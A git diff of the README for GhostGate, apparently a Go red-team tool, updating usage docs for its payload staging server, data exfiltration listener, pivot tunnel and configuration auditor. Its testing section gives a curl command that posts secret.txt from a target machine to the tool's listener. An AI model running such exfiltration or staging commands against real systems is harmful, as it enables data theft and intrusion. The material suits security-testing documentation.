@@ -44,37 +44,34 @@ GhostGate utilizes a subcommand-based CLI architecture. Run the tool using one o
 Hosts a local directory containing tools or payloads.
 
 ```bash
-go run main.go stageDir -p <port> -f <staging_path> -s <source_path>
-
+go run main.go stage -p <port> -d <staging_directory> -s <source_directory>
 ```
 
 | Flag | Default | Description |
 | --- | --- | --- |
-| `-p` | `cfg.DefaultPort` | The port number to host the staging server on. |
-| `-d` | `cfg.DefaultPayloadsDirectory` | The destination path of the staging directory. |
-| `-s` | *None (Required)* | The file path of your local source payloads directory. |
+| `-p`, `--port` | `cfg.DefaultPort` | The port number to host the staging server on. |
+| `-d`, `--directory` | `cfg.DefaultPayloadsDirectory` | The directory path to serve payloads from. |
+| `-s`, `--source` | *None (Optional)* | The file path of your local source payloads directory to copy tools from. |
 
 ### 2. Data Exfiltration Listener (`upload`)
 
 Launches an HTTP server specifically configured to receive raw binary files or text data via POST requests.
 
 ```bash
-go run main.go uploadFile -p <port> -u <endpoint_path>
-
+go run main.go upload -p <port> -u <endpoint_path> -d <destination_directory>
 ```
 
 | Flag | Default | Description |
 | --- | --- | --- |
-| `-p` | `cfg.DefaultPort` | The port number to bind the exfiltration listener to. |
-| `-u` | `cfg.DefaultURLPath` | The URI endpoint where the listener accepts uploads (e.g., `/upload`). |
-| `-d` | "uploads" | Destination folder to store uploaded files. |
+| `-p`, `--port` | `cfg.DefaultPort` | The port number to bind the exfiltration listener to. |
+| `-u`, `--url-path` | `cfg.DefaultURLPath` | The URI endpoint where the listener accepts uploads (e.g., `/uploads`). |
+| `-d`, `--destination` | `cfg.DefaultUploadsDirectory` | Destination folder to store uploaded files. |
 
 **Testing Exfiltration:**
 You can test the listener from a target machine using `curl`:
 
 ```bash
-curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://<GhostGate_IP>:<Port>/upload
-
+curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://<GhostGate_IP>:<Port>/uploads
 ```
 
 ### 3. Pivot Tunnel Server (`tunnel`)
@@ -82,34 +79,39 @@ curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://<Ghos
 Acts as an HTTP reverse proxy, routing incoming traffic received on the server out to a designated target destination.
 
 ```bash
-go run main.go tunnel -u <target_url> -p <local_port>
-
+go run main.go tunnel -p <local_port> -t <target_url>
 ```
 
 | Flag | Default | Description |
 | --- | --- | --- |
-| `-u` | *None (Required)* | The target destination URL you wish to tunnel traffic to. |
-| `-p` | `cfg.DefaultPort` | The local port to host the tunneling endpoint on. |
+| `-p`, `--port` | `cfg.DefaultPort` | The local port to host the tunneling endpoint on. |
+| `-t`, `--target` | *None (Required)* | The target destination URL you wish to tunnel traffic to. |
 
 **Interacting with the Tunnel:**
 
 ```bash
 curl -X GET http://<GhostGate_IP>:<Local_Port>/<path>
-
 ```
 
-### 4. Configuration Auditor (`auditCon`)
+### 4. Configuration Auditor (`audit`)
 
 Sends an active HTTP request to a target application to analyze its response headers, SSL configurations, and overall security posture.
 
 ```bash
-go run main.go auditCon -u <target_url>
-
+go run main.go audit -t <target_url>
 ```
 
 | Flag | Default | Description |
 | --- | --- | --- |
-| `-u` | *None (Required)* | The target URL to actively scan and audit. |
+| `-t`, `--target` | *None (Required)* | The target URL to actively scan and audit. |
+
+### 5. Configuration Initialization (`init`)
+
+Generates a JSON configuration file for GhostGate utilizing either interactive prompts or system defaults.
+
+```bash
+go run main.go init
+```
 
 ---
 
@@ -117,14 +119,16 @@ go run main.go auditCon -u <target_url>
 
 ```text
 GhostGate/
-├── config/                 # Handles configuration files and defaults via Viper
+├── cmd/                    # CLI commands and route routing via Cobra
+├── config/                 # Configuration file management (Viper) and init logic
 ├── internal/
-│   ├── essentail/          # Core operational logic (Staging, Auditing, Uploading)
-│   ├── networking/          # Network utilities (e.g., pulling outbound IPs)
-│   ├── sanitation/          # Cleans and normalizes CLI arguments 
-│   └── validation/          # Validates structural safety of inputs (Ports, paths, URLs)
-└── main.go                 # Application entrypoint and CLI router
-
+│   ├── commands/           # Business logic implementations for subcommands (Staging, Auditing, Uploading, Tunneling)
+│   ├── input/              # Input sanitization and safety validation (ports, file paths, URLs)
+│   ├── logger/             # Structured logging implementation
+│   ├── networking/         # Network helper functions (TLS, cert generation, outbound IPs)
+│   └── util/               # File system helpers and general utilities
+├── scripts/                # Automated validation and testing scripts
+└── main.go                 # Core entry point
 ```
 
 ---
